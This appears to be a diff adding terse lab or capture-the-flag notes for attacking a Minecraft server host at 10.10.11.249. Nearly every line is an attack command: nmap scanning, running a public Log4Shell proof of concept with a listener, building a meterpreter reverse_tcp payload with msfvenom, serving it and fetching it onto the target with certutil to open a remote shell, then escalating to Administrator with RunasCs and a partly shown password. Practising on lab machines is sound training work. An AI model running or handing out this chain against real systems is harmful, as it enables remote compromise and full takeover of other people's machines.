@@ -1,0 +1,40 @@
+sudo nmap -p 80,25565 -A -v 10.10.11.249
+echo "IP DOMAINNAME" | sudo tee -a /etc/hosts
+
+Vulnerabilidad
+git clone https://github.com/kozmer/log4j-shell-poc
+
+    #Copy in the '/log4j-shell-poc' directory
+    wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
+
+    tar -xf jdk-8u181-linux-x64.tar.gz #To extract
+
+    mv jdk1.8.0_181 jdk1.8.0_20 #poc.py is searching for this filename
+
+Ejecucion de exploit.
+python3 poc.py --userip <tun0 IP> --webport 80 --lport 4444
+
+Cliente minecraft con python
+  git clone https://github.com/ammaraskar/pyCraft
+  python3 start.py #in /pyCraft
+
+descargar y Enviar archivos
+
+meterpreter
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o expl.exe
+
+
+  python3 -m http.server 4245
+  certutil -urlcache -f http://<tun0 IP>:4245/expl.exe %temp%/expl.exe
+  #HTTP 200s should pop up on the python server
+  start %temp%/expl.exe
+  #meterpreter session should open on the msfconsole tab
+
+
+Elevacion de provilegios con RunasCs
+https://github.com/antonioCoco/RunasCs/releases?source=post_page-----316a735a306d--------------------------------
+https://github.com/antonioCoco/RunasCs
+Command 
+.\RunasCs.exe Administrator s67... expl2.exe
+start RunasCs.exe Administrator s67... expl2.exe
+
